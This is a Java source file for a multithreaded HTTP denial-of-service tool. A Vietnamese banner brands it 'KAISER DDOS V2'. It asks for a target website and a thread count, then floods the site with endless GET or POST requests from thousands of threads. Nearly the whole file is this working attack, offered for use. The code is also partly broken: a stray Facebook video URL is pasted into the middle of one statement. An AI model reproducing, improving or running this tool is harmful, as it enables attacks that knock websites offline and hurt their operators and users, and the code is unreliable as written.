import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;

import javax.net.ssl.HttpsURLConnection;


public class Dos implements Runnable {



    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";

    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Dos.url);
                        break;
                    case 2:
                        sslPostAttack(Dos.url);
                        break;
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;

                }
            }
        } catch (Exception e) {

        }
    }


    public static void main(String[] args) throws Exception {
        String url = "";
        int attakingAmoun = 0;
        Dos dos = new Dos(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.print("\033[1;35m╔══════════════════════════════════════════════════════════════╗\n\033[1;35m  ▒█░▄▀ ░█▀▀█ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█   ▀▀█▀▀ ▒█▀▀▀█ ▒█▀▀▀█ ▒█░\n\033[1;37m  ▒█▀▄░ ▒█▄▄█ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀   ░▒█░░ ▒█░░▒█ ▒█░░▒█ ▒█░\n\033[1;36m  ▒█░▒█ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█   ░▒█░░ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄█\n\033[1;93m╚══════════════════════════════════════════════════════════════╝\n \033[1;33mⓒCopyright : Văn Huy | HuyKaiser\n\033[1;37m  INFO Tool : Tool DDOS KAISER VER 2 BY HUYKAISER PROCODER\n\033[1;36m  FB ADMIN : https://www.facebook.com/HuyKaiser.profile\n\033[1;36m  ADMIN : Nguyễn Văn Huy\n\033[1;36m══════════════════════════════════════════════════════════════\n\033[1;36m         ADMIN TOOL BY VĂN HUY X HUYKAISER PROCODER\n\n\033[1;33m      ❤️Cám Ơn Bạn Đã Dùng Tool KAISER DDOS V2 Thanks❤️\n\033[1;73m══════════════════════════════════════════════════════════════\n\n");
        System.out.print(" \033[1;35m=> \033[1;36mNhập \033[1;37mLink \033[1;35mWeb: \033[1;37m");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println(" \033[1;37mChuẩn \033[1;33mBị \033[1;35mTấn \033[1;36mCông \033[1;34mWeb: " + url);

        String[] SUrl = url.split("://");

        System.out.println("\033[1;35m=> Kiểm Tra Kết Nối Tới Web");
        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("\033[1;34mADMIN TOOL BY HUYKAISER DZAI CUTO NHẤT TOOL OK");

        System.out.print("\033[1;36mNhập Số Lần Đánh Web ( MAX 7500 ): ");
        String amount = in.nextLine();

        if (amount == null || amount.equals(null) || amount.equals("")) {
            Dos.amount = 2000;
        } else {
            Dos.amount = Integer.parseInt(amount);
        }

        System.out.print("\033[1;36mNhập Methods VIP ( MAX 5M ): ");
        String option = in.nextLine();
        int ioption = 1;
        if (option == "get" || option == "GET") {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 3;
            } else {
                ioption = 4;
            }
        } else {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 1;
            } else {
                ioption = 2;
            }
        }

        Thread.sleep(2000);


        System.out.println("\033[1;36mHuyKaiser \033[1;37m| \033[1;35mDDOS V2 BẢN JAVA | \033[1;34mĐANG TẤN CÔNG WEB ");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new Dos(i, ioption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {

            }
        }
        System.out.println("\033[1;35mMain Thread ended");
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("\033[1;34mChecking Connection");
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("\033[1;35mConnected to website");
        }
        Dos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("\033[1;35mChecking Connection (ssl)");
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("\033[1;36mConnected to website");
        }
        Dos.url = url;
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);https://fb.watch/g9h-4FiPpV/
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
    }
}
